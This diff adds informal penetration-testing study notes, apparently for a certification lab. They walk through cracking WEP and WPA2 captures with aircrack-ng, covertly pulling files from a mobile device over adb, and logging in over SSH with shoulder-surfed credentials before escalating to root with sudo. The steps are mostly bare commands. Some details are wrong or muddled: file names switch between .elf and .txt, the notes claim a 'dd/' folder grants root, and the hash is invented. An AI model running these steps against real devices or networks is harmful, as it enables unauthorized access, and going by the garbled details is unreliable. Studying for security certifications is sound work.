@@ -234,3 +234,110 @@ Find the fqdn of a domain controller in a subnet
 	FQDN - DC.penetester.team
 
 
+Hacking Wireless Networks
+
+	To crack a WEP network
+		aircrack-ng <pcap file>
+	
+	To crack a WPA2 network
+		aircrack-ng -a2 -b <target BSSID> -w <password list.txt> <WP2 PCAP file>
+		
+	
+An insider attack has been identified in one of the employees mobile device in 192.168.0.0/24 subnet. Yiu are assigned to 
+covertly access the users device to obtain
+
+		Malicious elf files stored in a folder "scan"
+		Perform deel scan on the elf files to obtain de last 4 digits of the SHA384 hash file of the file with the highest
+		entropy value
+		
+		We already connect with adb to the target - in port 5555
+		
+			adb connect 192.168.56.12:5555
+			adb shell
+			cd sdcard
+			cd scan
+				ls
+				file1.elf
+				file3.elf
+				file3.elf
+				
+			first we need to move this folder to our machine
+				we copy the path were the files are /sdcard/scan
+			
+			adb pull /sdcard/scan dd/			dd/ is get root permissions
+			
+			a scan folder id created in our machine with the .elf files
+			
+			cd scan
+				ls
+				file1.elf
+				file3.elf
+				file3.elf
+	
+		Now we need to calculate de entropy and see which of the files has the highest entropy value
+		
+			ent file1.txt
+			
+			ent file2.txt
+			
+			ent file3.txt
+			
+		With this tool we get different Entropy values
+
+		Now that we have the file with the hig entropy (lets say is file1.txt),
+			sha384sum file1.txt
+			
+			it generates a hash:
+			fsdflklkjlksljkjflksdfljlskdjflksdjflskdklkfjslkdjfslkdfdffdfddfe344543ef
+			
+		so to answer the question, the last four digits are: 43ef
+		
+		
+Priviledge Escalation
+Example:
+
+Q1 - You used shoulder surfing to identify the username and password of a user on the Ubuntu machine in the 192.168.0.0/24 network that is kali and pass@123. Access the target machine , 
+perform vertical escalation to that of a root user and enter the content of the imroot.txt file as the answer.
+
+	nmap -sV -p 22 192.168.0.0/24
+	
+	after we identify the ip with port 22 open and running linux, we enter with
+	
+		ssh kali@192.168.0.1
+		
+		use the given password pass@123
+		
+			Now that we are in lets see what we can do if we were sudo
+			
+			sudo -l
+			
+			Lets try to get root
+			
+			sudo -i
+			
+			If it is accepted by the system
+			
+			whoami
+			
+			root
+			
+			Great, let find the file...
+			
+				find . -name imroot.txt
+
+				
+			
+				
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
